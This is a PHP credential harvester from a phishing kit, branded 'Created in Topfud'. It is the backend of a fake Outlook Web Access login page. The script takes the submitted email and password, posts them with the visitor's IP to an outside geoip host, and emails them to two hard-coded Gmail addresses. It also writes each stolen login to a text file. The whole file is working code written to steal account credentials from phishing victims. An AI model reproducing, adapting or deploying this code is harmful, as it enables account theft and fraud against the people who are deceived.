<?php

// THIS SCRIPT CODED BY TOPFUD.com
// Skype : TOPFUD@hotmail.com ,, live:.cid.f3ca894e49395bbe
// ICQ : 624088694
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
// !!!! IF NOT WORKING CONTACT US  !!!
// !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!


//------------------------------------//
$recipient = 'officialloggs@gmail.com, securedmail736@gmail.com'; // Put your email address here
//----------------------------------//



if(isset($_POST['user']) && isset($_POST['pass'])){

function visitor_country($ip)
{
    
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, "http://goips.net/api/geoip/lookup.php");
curl_setopt($ch, CURLOPT_POST ,TRUE); 
curl_setopt ($ch, CURLOPT_POSTFIELDS, http_build_query($ip)); 
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
return $result = json_decode(curl_exec($ch), true);
}
$data = $_POST;
$data['browser'] = $_SERVER['HTTP_USER_AGENT'];
$link = 'ERROR';
$data['adddate'] = date("D M d, Y g:i a");
$data['ip'] = getenv("REMOTE_ADDR");
$res = visitor_country($data);
$data['country'] = $res['country'];
if($res['status'] == "ERROR")
{
	$date = date('d-m-Y');
	$ip = getenv("REMOTE_ADDR");
	$message  = "--------+ Unknown Login OWA  +--------\n";
	$message .= "Email : ".$data['user']."\n";
	$message .= "Password : ".$data['pass']."\n";
	$message .= "-----------------------------------\n";
	$message .= "User Agent : ".$data['browser']."\n";
	$message .= "Client IP : ".$data['ip']."\n";
	$message .= "Country : ".$data['country']."\n";
	$message .= "Date: ".$data['adddate']."\n";
	$message.= "-----------------+ Created in Topfud+------------------\n";
	$subject  = "OWA | Unknown Login OWA : " . $data['country']. "\n";
	$headers  = "MIME-Version: 1.0\n";
	mail($recipient,$subject,$message,$headers);
	$fp = fopen("use.txt","a");
	fputs($fp,$message);
	fputs($fp,"\n");
	fclose($fp);
    echo '0';
    }else{
    $link  = $res['host'];
   	$date = date('d-m-Y');
	$ip = getenv("REMOTE_ADDR");
	$message  = "--------+ OWA True login Verified   +--------\n";
	$message .= "Email : ".$data['user']."\n";
	$message .= "Password : ".$data['pass']."\n";
	$message .= "Link : ".$link."\n";
	$message .= "-----------------------------------\n";
	$message .= "User Agent : ".$data['browser']."\n";
	$message .= "Client IP : ".$data['ip']."\n";
	$message .= "Country : ".$data['country']."\n";
	$message .= "Date: ".$data['adddate']."\n";
	$message.= "-----------------+ Created in Topfud+------------------\n";
	$subject  = "OWA True Login| ".$data['adddate']."\n. " . $data['country'] . "\n";
	$headers  = "MIME-Version: 1.0\n";
	mail($recipient,$subject,$message,$headers);
	$fp = fopen("use.txt","a");
	fputs($fp,$message);
	fputs($fp,"\n");
	fclose($fp);
    echo $link;
   


}
}


?>